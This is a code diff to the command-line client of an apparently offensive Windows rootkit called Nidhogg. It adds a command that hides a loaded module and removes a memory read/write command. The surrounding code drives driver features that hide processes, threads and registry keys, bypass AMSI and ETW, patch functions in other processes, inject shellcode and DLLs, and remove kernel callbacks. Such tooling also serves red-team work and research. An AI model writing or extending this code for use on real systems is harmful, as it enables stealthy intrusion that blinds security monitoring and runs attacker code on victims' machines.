@@ -13,11 +13,11 @@ enum class Options {
 void PrintUsage() {
 	std::cout << "[ * ] Possible usage:" << std::endl;
 	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | unhide | elevate | signature | query ] [pid] [signer type] [signature signer]" << std::endl;
+	std::cout << "\tNidhoggClient.exe module [hide | unhide] [pid] [module path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | query ] [tid]" << std::endl;
 	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
 	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;
-	std::cout << "\tNidhoggClient.exe [write | read] [pid] [remote address] [size] [mode]" << std::endl;
 	std::cout << "\tNidhoggClient.exe shinject [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
 	std::cout << "\tNidhoggClient.exe dllinject [apc | thread] [pid] [dll path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe callbacks [query | remove | restore] [callback type] [callback address]" << std::endl;
@@ -263,8 +263,9 @@ int wmain(int argc, const wchar_t* argv[]) {
 			else if (_wcsicmp(argv[1], L"thread") == 0) {
 				success = Nidhogg::ProcessUtils::NidhoggThreadHide(hNidhogg, _wtoi(argv[3]));
 			}
-			else if (_wcsicmp(argv[1], L"file") == 0) {
-				success = NIDHOGG_INVALID_OPTION;
+			else if (_wcsicmp(argv[1], L"module") == 0) {
+				if (argc == 5)
+					success = Nidhogg::MemoryUtils::NidhoggHideModule(hNidhogg, _wtoi(argv[3]), (wchar_t*)argv[4]);
 			}
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
 				if (argc == 5) {
@@ -568,17 +569,17 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 
 			if (_wcsicmp(argv[3], L"amsi") == 0) {
-				success = Nidhogg::ModuleUtils::NidhoggAmsiBypass(hNidhogg, pid);
+				success = Nidhogg::MemoryUtils::NidhoggAmsiBypass(hNidhogg, pid);
 			}
 			else if (_wcsicmp(argv[3], L"etw") == 0) {
-				success = Nidhogg::ModuleUtils::NidhoggETWBypass(hNidhogg, pid);
+				success = Nidhogg::MemoryUtils::NidhoggETWBypass(hNidhogg, pid);
 			}
 			else {
 				std::wstring wFunctionName(argv[4]);
 				std::string functionName(wFunctionName.begin(), wFunctionName.end());
 				std::vector<byte> patch = ConvertToVector(std::wstring(argv[5]));
 
-				success = Nidhogg::ModuleUtils::NidhoggPatchModule(hNidhogg, pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
+				success = Nidhogg::MemoryUtils::NidhoggPatchModule(hNidhogg, pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
 			}
 			break;
 		}
@@ -625,17 +626,6 @@ int wmain(int argc, const wchar_t* argv[]) {
 				std::cerr << "[ - ] Invalid address." << std::endl;
 				success = NIDHOGG_INVALID_OPTION;
 				break;
-			}
-
-			if (_wcsicmp(argv[1], L"write") == 0)
-				success = Nidhogg::ModuleUtils::NidhoggWriteData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
-			else if (_wcsicmp(argv[1], L"read") == 0) {
-				auto data = Nidhogg::ModuleUtils::NidhoggReadData(hNidhogg, pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
-
-				if ((int)data < 5)
-					success = (int)data;
-
-				std::cout << "[ + ] You can access the data here" << std::endl;
 			}
 			break;
 		}
@@ -688,7 +678,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			std::vector<unsigned char> shellcode(std::istreambuf_iterator<char>(input), {});
 
-			success = Nidhogg::ModuleUtils::NidhoggInjectShellcode(hNidhogg, pid, shellcode.data(), shellcode.size(), parameter1, parameter2, parameter3, injectionType);
+			success = Nidhogg::MemoryUtils::NidhoggInjectShellcode(hNidhogg, pid, shellcode.data(), shellcode.size(), parameter1, parameter2, parameter3, injectionType);
 			break;
 		}
 
@@ -717,7 +707,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			std::wstring temp = std::wstring(argv[4]);
 			std::string dllPath = std::string(temp.begin(), temp.end());
 
-			success = Nidhogg::ModuleUtils::NidhoggInjectDll(hNidhogg, pid, dllPath.c_str(), injectionType);
+			success = Nidhogg::MemoryUtils::NidhoggInjectDll(hNidhogg, pid, dllPath.c_str(), injectionType);
 			break;
 		}
 	}
